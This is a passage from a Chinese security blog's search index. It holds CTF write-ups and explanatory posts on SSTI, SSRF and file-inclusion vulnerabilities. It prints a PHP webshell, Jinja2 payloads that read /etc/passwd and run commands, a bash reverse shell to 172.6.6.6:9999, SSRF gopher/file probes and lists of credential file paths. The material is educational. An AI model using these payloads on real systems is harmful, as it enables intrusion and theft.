2019]BuyFlag","url":"https://husins.cn/BUUCTF之-极客大挑战-2019-BuyFlag/","content":"知识点is_numberic:可以使用%00和%20绕过\nstrcmp()：这一个漏洞适用与5.3之前版本的php\nstrcmp(&#x27;str1&#x27;,&#x27;str2&#x27;)    if(str1&gt;str2) return &gt;0    if(str1&lt;str2) return &lt;0    if(str1 == str2) return 0    if(str1 = arry[] &amp;&amp; str2 = string) return 0\n\n\n\n解题\n打开题目 打开payflag的功能菜单，提示flag需要100000000 money\n\n结合上述提示可知 获得flag需要三个步骤\n1.a student from CUIT\n2.输入正确的密码\n3.输入正确的金额\n第一点是身份验证，可以看一下cookie\n](https://imgchr.com/i/sjNmZT)\n可以发现cookie很简单 就是user=0 因此是不是可以推测 user=1就可以完成CUIT的身份确认\n\n查看源码发现这里有对密码的提示，\n\n根据审计可知 要绕过is_number函数 且 password值为404 所以 POST传参为：password=404%00\n\n依次修改cookie和POST传参，\n\n下一步就是要传入money的值\n\n这里提示数字太长了，因此我们可以推测可能是strcmp比较，\n\n抓个包 发现php版本为5.3.3 可以使用 数组绕过\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[SUCTF 2019]CheckIn","url":"https://husins.cn/BUUCTF之-SUCTF-2019-CheckIn/","content":"知识点.user.ini 是什么？​        .user.ini实际上就是自定义的php.ini.通过使用两个方法auto_prepend_file、auto_append_file实现类似于文件包含的功能。\n使用条件：(1)服务器脚本语言为PHP(2)对应目录下面有可执行的php文件(3)服务器使用CGI／FastCGI模式\n解题\n打开图片上传一个正常的 .png 的图片 观察返回的信息 返回了目录路径 返回了当前文件夹存在的 东西\n\n上传图片马 发现 会对图片信息进行  过滤和查看  。  这里 &lt;? 被过滤了 只能换一个 马\n&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[8])&lt;/script&gt;\n\n经过测试 几乎所有后缀 名 全被ban了，只能想想骚姿势\n\n正常不修改文件后缀，可以上传图片马，因此可以使用之前提到的 .user.ini 将图片马 包含到 已经存在的 index.php 里面 。\n\n第一次上传失败了  原因是 不是图片  一次 在构造时 加上一个图片识别的前缀\n\n\n这样就成功上传，可以去 快落的连接蚁剑了。\n\n连接成功 得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BUUCTF之[HCTF 2018]admin","url":"https://husins.cn/BUUCTF之-HCTF-2018-admin/","content":"知识点flask–session存储机制\n实现\nfrom datetime import timedeltafrom flask import Flask, request, redirect, url_for, sessionapp = Flask(__name__)#设置我们的秘钥 用于对sessionid进行加密app.secret_key=&quot;lH4WHi5amT0ZqykHvLofllRJu3UN1uzmeUN0z2IiacjDUb5TLU3ZTtUP5VJqgkMY&quot;#设置session的过期时间app.permanent_session_lifetime = timedelta(days=7)\n\n调用\n@app.route(&#x27;/&#x27;)def index():    #访问首页时 如果是登录状态 则 提示欢迎信息    username = session.get(&quot;username&quot;)    if username:        #删除session的数据        return &quot;欢迎回来%s&quot;%username    #如果没有登录 跳转到登录页面    return redirect(url_for(&quot;login&quot;))#登录的路由@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if request.method == &#x27;GET&#x27;:        with open(&quot;login.html&quot;) as f:            login_html_content = f.read()            return login_html_content    #Post处理    username = request.form.get(&quot;username&quot;)    password = request.form.get(&quot;password&quot;)    #验证登录信息    if username == &#x27;zx&#x27; and password==&quot;123&quot;:        print(&quot;登录成功&quot;)        #将我们的状态数据保存到session        session[&quot;username&quot;] = username        #设置session是否持久化（） 默认为false（会话结束自动删除）        session.permanent = True        # #删除字典数据        # session.pop(&quot;username&quot;)        return redirect(url_for(&quot;index&quot;))    else:        return &#x27;登录失败&#x27;if __name__ == &#x27;__main__&#x27;:    app.run()\n\n\n\n解题：\n登陆页面 发现有两个功能 登陆和注册 分别检测 两个功能。 登陆功能没有什么点可以用，只能注册，注册一个test用户登陆看看！\n\n发现有四个功能，返回主页面，提交留言，修改密码，登出\n\n在查看一手源代码，看来在提示要admin登陆了。\n\n修改密码页面存在提示，github上面应该是他的源码，去嫖一手。\n\n这里用到了session，因此可以想到篡改session实现admin登陆\n\n得到 test账号的session 尝试解密\n\n根据脚本得到解密串:\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n将text改为admin可得\n&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4765861b12328638115df84695bf022807817e5be468dac58d116b15882a91c9cddde6325d9304aabdb9f3edee5ecb738aaa789431c594eb94e960a90fb685ee&#39;, &#39;csrf_token&#39;: b&#39;ebf9106fbf271c5ec3868795513cda5fc4589b28&#39;, &#39;image&#39;: b&#39;9L7q&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n根据flask session的特性 我们还必须找到 加密所需的密钥\n\n在 config.py中找到密钥\n\n在得到加密之后的字符串，将其为session赋值即可admin登陆。\n\n得到flag。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"浅析SSTI漏洞","url":"https://husins.cn/浅析SSTI漏洞/","content":"python-flask-ssti(模版注入漏洞)原理：SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。\n模板注入和SQL注入很像，都是用户输入被当做代码执行（因此，“用户的输入都是不可信的”）这句话整的很实用。\n前置知识：1.运行一个一个最小的 Flask 应用from flask import Flaskapp = Flask(__name__)&quot;&quot;&quot;第一部分，初始化：所有的Flask都必须创建程序实例，web服务器使用wsgi协议，把客户端所有的请求都转发给这个程序实例程序实例是Flask的对象，一般情况下用如下方法实例化Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名`&quot;&quot;&quot;`@app.route(&#x27;/&#x27;)def hello_world():    return __name__#  第二部分，路由和视图函数：#  客户端发送url给web服务器，web服务器将url转发给flask程序实例，程序实例#  需要知道对于每一个url请求启动那一部分代码，所以保存了一个url和python函数的映射关系。#  处理url和函数之间关系的程序，称为路由#  在flask中，定义路由最简便的方式，是使用程序实例的app.route装饰器，把装饰的函数注册为路由 if __name__ == &#x27;__main__&#x27;:    print(&#x27;dd&#x27;,__name__)    app.run()#  第三部分：程序实例用run方法启动flask集成的开发web服务器#  __name__ == &#x27;__main__&#x27;是python常用的方法，表示只有直接启动本脚本时候，才用app.run方法#  如果是其他脚本调用本脚本，程序假定父级脚本会启用不同的服务器，因此不用执行app.run()#  服务器启动后，会启动轮询，等待并处理请求。轮询会一直请求，直到程序停止。\n\n如上述代码所示，app是flask的实例，功能就是接受来自web服务器的请求，\n\n\n浏览器将请求给web服务器，web服务器将请求给app ,\n\napp收到请求，通过路由找到对应的视图函数，然后将请求处理，得到一个响应response\n\n然后app将响应返回给web服务器，\n\nweb服务器返回给浏览器，\n\n浏览器展示给用户观看，流程完毕。\n2.jinja2jnja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。\n\n​        jinja2 存在着三种特殊的语句：\n\n&#123;%   %&#125;：控制结构。\n\n&#123;&#123;   &#125;&#125;：变量取值。被两个括号包裹的内容会输出其表达式的值\n\n&#123;#     #&#125;：注释。\njinja2模板中使用&#123;&#123;   &#125;&#125;语法表示一个变量，他是一种特殊的占位符。当利用jinja2进行渲染时，他会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的python数据类型。\njinja2中的过滤器：\n变量名后面加一根竖线，再跟上过滤器的名字就能使用特定的过滤器修改变量了。\n\n\n\nsafe 过滤器值得特别说明一下。默认情况下，出于安全考虑， Jinja2 会转义所有变量。很多情况下需要显示变量中存储的 HTML 代码，这时就可使用 safe 过滤器。\ninja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。\n3.python魔法函数​    Python内置的以双下划线开头并以双下划线结尾的函数（不能自己定义，没有用），如_等很多，用于实现并定制很多特性，非常灵活，且是隐式调用的。　\n​    魔法函数会直接影响到Python语法本身，如让类变成可迭代的对象，也会影响Python的一些内置函数的调用，如实现len()能对对象调用len()方法。\n常用的魔法函数：https://www.cnblogs.com/small-office/p/9337297.html\n4.python中的object​    在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法\nPython中一些常见的特殊方法：\n__class__返回调用的参数类型。__base__返回基类__mro__允许我们在当前Python环境下追溯继承树__subclasses__()返回子类\n\n　\n\n\n   ​    \nssti漏洞检测   检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：\n   \n漏洞利用1.payload原理​    ·Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数。加上python中的魔术方法，object类中的基本方法。结合这几个 我们可以 实现任意代码的执行。\n2.payload具体思路\n现在我们的思路就是从一个内置变量调用__class__.base__等隐藏属性，去找到一个函数，然后调用其__globals[&#x27;builtins&#x27;]即可调用eval等执行任意代码。\n\nbuiltins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块\n &#x27;&#x27;.__class__.__base__.__subclasses__()# 返回子类的列表 [,,,...]#从中随便选一个类,查看它的__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性#再换几个子类，很快就能找到一个重载过__init__的类，比如 &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__ &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]#然后用eval执行命令即可\n\n常用的payloadpython2：​    文件的写入和读取\n#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;#写文件&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/1&#x27;).write(&quot;&quot;) &#125;&#125;\n\n​    任意执行\n​    每次执行都要先写然后编译执行\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;code&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  \n\n​    写入一次\n&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/owned.cfg&#x27;,&#x27;w&#x27;).write(&#x27;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&#x27;)&#125;&#125;  &#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;  &#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/usr/bin/id&#x27;,shell=True) &#125;&#125;    \n\n​    不回显的\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;1+1&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125;\n\n​    任意执行只需要一条指令\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;(system函数换为popen(&#x27;&#x27;).read()，需要导入os模块)  &#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)\n\n​    总结\n通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。\n\npython3​        因为python3没有file了，所以用的是open\n​        文件读取\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;\n\n​        任意执行\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;\n\n​        命令执行\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n​        \nWAF绕过python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#x27;os.system(&quot;ls&quot;)&#x27;)().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;)python3：&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;)[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)\n\n例题演示题目：攻防世界之Web_python_template_injection\n连接：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1\n\n打开题目提示存在 python 的模板注入\n\n传参之后页面报错 但是输入的参数 a和x 已经被成功输入。\n.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D,来查看所有模块\n\n3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个\n4.访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中\n\n5.使用[&#39;o&#39;+&#39;s&#39;],可绕过对os字符的过滤，访问http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D查看flag文件所在\n\n6.访问\n","categories":["漏洞总结"],"tags":["SSTI"]},{"title":"浅析SSRF漏洞","url":"https://husins.cn/浅析SSRF/","content":"SSRF(Server-side Request Forge, 服务端请求伪造)什么是 SSRF他是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 形成的原因​    大多数SSRF产生的原因是服务端提供了从其他服务器获取数据的功能,并且没有对目的地址做过滤和限制.比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载\n代码案例\n//curl造成的SSRFfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[&#x27;url&#x27;];curl($url);  //file_get_contents造成的SSRF$url = $_GET[&#x27;url&#x27;];echo file_get_contents($url);//fsockopen造成的SSRF&lt;?phpfunction Getfile($host, $port, $link)&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);    if(!$fp)&#123;        echo &quot;$errstr (error number $errno) \\n&quot;;    &#125;else&#123;        $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;        $out .= &quot;HOST $host \\r\\n&quot;;        $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;        $out .= &quot;\\r\\n&quot;;        fwrite($fp, $out);        $content = &#x27;&#x27;;        while(!feof($fp))&#123;            $contents .= fgets($fp, 1024);        &#125;        fclose($fp);        return $contents;    &#125;&#125;\n\n\n\nSSRF攻击流程假定 A 为一个公司的主站,所有人都可以访问, B 是该公司内部的一个网站,只有公司能为能够访问,且与 A 能够相互访问。\n正常用户：\n输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求，并处理 –&gt;返回用户响应\n此时如果A服务器接受请求是没有经过严格的过滤，导致A能够在B上获取数据，就会产生SSRF\n例如:\n正常用户输入的URL:http://www.123.com/index.php?img=www.aaa.com/1.jpg\n攻击者将www.aaa.com换成B的内网地址,如果存在就返回1XX | 2XX的状态码,不存在就会出现其他的状态码\n因此,SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。\nSSRF可能出现的地方(核心就是调用外部资源的所有参数都有可能)\n社交分享功能：获取超链接的标题等内容进行显示\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n在线翻译：给网址翻译对应网页的内容\n\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n邮件系统：比如接收邮件服务器地址\n\n编码处理, 属性信息处理，文件处理：比如fpmg，ImageMagick，docx，pdf，xml处理器等\n\n从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n将url换成我们的DNS服务器，通过查看DNFlog平台日志看是否有服务器ip判断是否有SSRF漏洞\n\n\nSSRF的危害\n让服务端去访问相应的网址\n\n让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms\n\n可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件\n\n攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包payload）\n\n判断内网主机是否存活：方法是访问看是否有端口开放\n\nDoS攻击（请求大文件，始终保持连接keep-alive always）\n\n\nSSRF漏洞利用\ndict协议,操作redis服务,例如:dict://127.0.0.1:6379/info\n\nfile协议,任意文件读取,例如:file:///etc/passwd\n\ngopher,反弹shell,例如gopher://127.0.0.1:6379/xxxxxxx\n\nhttp,结合burpsuite探测内网存活主机\n\n\nSSRF利用小技巧\nhttp://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的\n\n各种IP地址的进制转换\n\nURL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/\n\n短网址绕过 http://t.cn/RwbLKDx\n\nxip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意,利用重定向）\n\n限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80\n\n例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，但这样可以用 http://abc@10.153.138.81/ 绕过\n\n\nSSRF如何防护\n黑名单\n过滤10.0.0.0/8 、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址\n过滤file:///、dict://、gopher://、ftp:// 危险协议\n对返回的内容进行识别\n\n\n白名单\n使用地址白名单\n对返回内容进行识别\n需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用 CURLOPT_FOLLOWLOCATION；然后通过域名获取目标ip，并过滤内部ip；最后识别返回的内容是否与假定内容一致\n\n\n\n","categories":["漏洞总结"],"tags":["SSRF"]},{"title":"浅析文件包含漏洞","url":"https://husins.cn/浅析文件包含漏洞/","content":"文件包含漏洞什么是文件包含​        程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。\n​        简单来说就是为了增加代码的复用性,将重复使用的代码写入一个文件后,通过文件包含函数,在一个文件中包含另一个文件。\n文件包含漏洞形成的原因。​        随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码，就造成了文件包含漏洞。\n示例：\n​            \n&lt;?php    $filename  = $_GET[&#x27;filename&#x27;];    include($filename);?&gt;\n\n$_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改\n$_GET[&#39;filename&#39;]的值，执行非预期的操作。\n文件包含漏洞所使用的函数\ninclude( )当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。\n\ninclude_once( )功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次\n\nrequire( )require()与 include()的区别在于 require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。\n\nrequire_once( )功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。\n\n\n当出现上述四个函数是,就可能出现文件包含漏洞\n文件包含漏洞的危害\n读取本地文件,获取主机上的敏感信息。例如：配置文件，日志，密码\n\n常见的敏感信息路径：\nWindows系统\n\nc:\\boot.ini // 查看系统版本\nc:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件\nc:\\windows\\repair\\sam // 存储Windows系统初次安装的密码\nc:\\ProgramFiles\\mysql\\my.ini // MySQL配置\nc:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码\nc:\\windows\\php.ini // php 配置信息\n\nLinux/Unix系统\n\n/etc/passwd // 账户信息\n/etc/shadow // 账户密码文件\n/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置\n/usr/local/app/php5/lib/php.ini // PHP相关配置\n/etc/httpd/conf/httpd.conf // Apache配置文件\n/etc/my.conf // mysql 配置文件\n\n\n\n\n远程文件包含：攻击者访问玩不地址来加载远程的代码，需要php.ini中allow_url_fopen和allow_url_include要为On。而且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是php)\n\n可以包含木马文件进行getshell\n\n\n\n文件包含漏洞的利用\n读取本地文件\n\n \n\n\n  在同级目录下创建index.php和flag.php两个文件\n  \n\n可以读取flag.php文件里面的内容\n\n远程文件包含:包含远程文件地址中的木马,使用蚁剑等工具进行连接\n\n文件包含漏洞的小技巧\n大小写绕过\n文件后加入特殊字符绕过利用工具，将访问路径后加入%00，可以绕过后缀检查。或者后面加一些特殊字符例如 斜杠 点之类。\n省略后缀有些程序会将传入参数指引到其他位置，或者修改后缀名，先访问文件判断，例如不需要写后缀名。\n双写绕过当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php”，”…/“，只需再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。\nnginx目录解析漏洞当判断到中间件是nginx时，我们可以利用nginx目录解析，当我们只能上传.jpg文件时，我们无法利用，只能原文读取出来，但是发现在shell.jpg后加/xxx.php,他就能以php方式读取文件，这就是目录解析漏洞。\n包含日志文件\n伪协议包含当不能直接访问目录下文件时，可以选择利用伪协议来访问文件，伪协议有以下几种：（allow_url_fopen和allow_url_include）都为On（1）page=file://[绝对路径]当页面有file1，file2……后台会判断是否已file开头，我们可以使用此协议。（2）php:// 访问各个输入/输出流（I/O streams）php://filter用于读取源码php://input用于执行php代码，或者直接将代码写入执行。（3）zip://[绝对路径], bzip2://[绝对路径], zlib://[绝对路径]协议，都属于压缩楼，访问压缩文件中的子文件，不需要指定后缀phar:// 可以查找指定压缩包内的文件，相对路径与绝对路径都可以写（4）data: text/plain,与input类似，当我们想查看源代码时，可以将其先转换为base64文件在传到页面上就不会执行PHP了（5）http协议也可以传入外部链接，自己服务器的钓鱼网站。\n\n文件包含漏洞如何防护\n\n\n设置白名单\n代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。\n\n\n\n过滤危险字符\n由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。\n\n\n设置文件目录\nPHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。\n\n\n关闭危险配置\nPHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。\n\n\n","categories":["漏洞总结"],"tags":["文件包含"]}]